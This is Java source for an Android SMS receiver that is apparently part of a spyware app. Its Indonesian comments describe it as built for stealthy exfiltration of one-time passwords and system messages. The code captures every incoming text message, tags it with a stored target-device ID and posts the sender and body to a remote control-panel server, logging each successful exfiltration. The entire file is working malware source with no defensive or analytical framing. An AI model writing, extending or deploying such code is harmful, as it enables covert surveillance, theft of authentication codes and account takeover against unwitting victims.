package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * SmsReceiver: Interceptor Pesan Teks.
 * Dioptimalkan untuk eksfiltrasi OTP dan pesan sistem secara stealth.
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "NXOB_SMS";
    // FIXED: Port disesuaikan ke 2026 sesuai Server.js
    private static final String SERVER_URL = "http://127.0.0.1:3000/api/post-notification/";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()) || 
            "android.intent.action.SMS_RECEIVED".equals(intent.getAction())) {
            
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                try {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    String format = bundle.getString("format");

                    if (pdus != null) {
                        StringBuilder fullMessage = new StringBuilder();
                        String sender = "";

                        for (Object pdu : pdus) {
                            SmsMessage sms;
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                                sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                            } else {
                                sms = SmsMessage.createFromPdu((byte[]) pdu);
                            }
                            
                            if (sms != null) {
                                sender = sms.getOriginatingAddress();
                                fullMessage.append(sms.getMessageBody());
                            }
                        }

                        String messageText = fullMessage.toString();
                        
                        // Ambil Target ID dari SharedPreferences
                        SharedPreferences prefs = context.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                        String targetId = prefs.getString("targetId", "UNKNOWN_DEVICE");

                        // Kirim ke Panel
                        relaySmsToPanel(targetId, sender, messageText);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error: " + e.getMessage());
                }
            }
        }
    }

    private void relaySmsToPanel(String targetId, String sender, String text) {
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(SERVER_URL + targetId);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setConnectTimeout(15000);
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                // FIXED: Menyelaraskan key JSON agar sinkron dengan rute server & panel
                json.put("id", targetId);
                json.put("app", "SMS_SYSTEM");
                json.put("title", "SMS FROM: " + sender);
                json.put("body", text); // Key 'body' sesuai ekspektasi Server.js
                json.put("package", "com.android.mms");
                json.put("timestamp", System.currentTimeMillis());

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = json.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                    os.flush();
                }

                if (conn.getResponseCode() == 200) {
                    Log.d(TAG, "[+] SMS Exfiltration Success: " + sender);
                }
            } catch (Exception e) {
                Log.e(TAG, "[-] Relay Failed: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}